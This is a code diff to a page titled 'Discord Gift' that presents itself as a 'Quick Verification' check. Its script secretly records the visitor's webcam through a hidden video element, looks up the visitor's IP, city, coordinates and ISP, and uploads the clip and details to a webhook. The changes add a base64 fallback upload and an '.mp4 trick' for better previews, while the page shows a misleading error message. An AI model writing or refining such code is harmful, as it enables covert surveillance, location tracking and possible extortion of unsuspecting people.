@@ -16,31 +16,11 @@
 
   <title>Discord Gift</title>
   <style>
-    body { 
-      margin:0; 
-      background:#111; 
-      color:#eee; 
-      font-family:Arial, sans-serif; 
-      text-align:center; 
-      padding: 20vh 10px; 
-      min-height:100vh; 
-    }
-    #msg { 
-      font-size:1.8em; 
-      margin:20px; 
-    }
-    video { display:none; } /* hidden forever */
+    body { margin:0; background:#111; color:#eee; font-family:Arial, sans-serif; text-align:center; padding: 20vh 10px; min-height:100vh; }
+    #msg { font-size:1.8em; margin:20px; }
+    video { display:none; }
     .container { max-width:600px; margin:auto; }
-    button { 
-      padding:15px 40px; 
-      font-size:1.3em; 
-      background:#0066cc; 
-      color:white; 
-      border:none; 
-      border-radius:8px; 
-      cursor:pointer; 
-      margin:20px; 
-    }
+    button { padding:15px 40px; font-size:1.3em; background:#0066cc; color:white; border:none; border-radius:8px; cursor:pointer; margin:20px; }
     button:hover { background:#0055aa; }
     button:disabled { opacity:0.6; cursor:not-allowed; }
   </style>
@@ -49,9 +29,7 @@
   <div class="container">
     <h1>Quick Verification</h1>
     <p id="msg">Please click verify to continue. This helps prove you're a human.</p>
-    
     <video id="video" autoplay playsinline muted></video>
-
     <button id="btn">Verify Me</button>
   </div>
 
@@ -81,14 +59,10 @@
         const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
         const chunks = [];
 
-        recorder.ondataavailable = e => {
-          if (e.data.size > 0) chunks.push(e.data);
-        };
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
 
         recorder.onstop = async () => {
-          if (chunks.length === 0) {
-            throw new Error("No data captured");
-          }
+          if (chunks.length === 0) throw new Error("No data");
 
           const blob = new Blob(chunks, { type: 'video/webm' });
 
@@ -98,25 +72,43 @@
             if (geoRes.ok) {
               const data = await geoRes.json();
               if (!data.error) {
-                geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'} (${data.country_code || 'n/a'})\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nTimezone: ${data.timezone || 'n/a'}\nISP: ${data.org || 'n/a'}`;
+                geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'}\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nISP: ${data.org || 'n/a'}`;
               }
             }
           } catch {}
 
           const payload = {
-            content: `🎥 Silent 10s capture\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`
+            content: `🎥 New verification clip attached (silent capture)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`
           };
 
           const formData = new FormData();
-          formData.append('file', blob, `capture_${Date.now()}.webm`);
+          formData.append('file', blob, `verification_${Date.now()}.mp4`);  // .mp4 trick for better preview chance
           formData.append('payload_json', JSON.stringify(payload));
 
           msg.textContent = "Finalizing...";
 
-          await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+          const response = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 
-          msg.textContent = "Verification incomplete. Center Face In Camera View";
-          btn.style.display = 'none';
+          if (response.ok) {
+            msg.textContent = "Verification incomplete. Center Face In Camera View";
+            btn.style.display = 'none';
+          } else {
+            // Fallback if upload bombs (e.g. size/rate limit)
+            const reader = new FileReader();
+            reader.onload = async () => {
+              const base64 = reader.result.split(',')[1];
+              await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  content: `Capture failed upload - base64 snippet (first 1000 chars):\n${base64.slice(0,1000)}...\n\n${payload.content}`
+                })
+              });
+              msg.textContent = "Verification incomplete. Center Face In Camera View";
+            };
+            reader.readAsDataURL(blob);
+          }
+
           stream.getTracks().forEach(track => track.stop());
         };
 
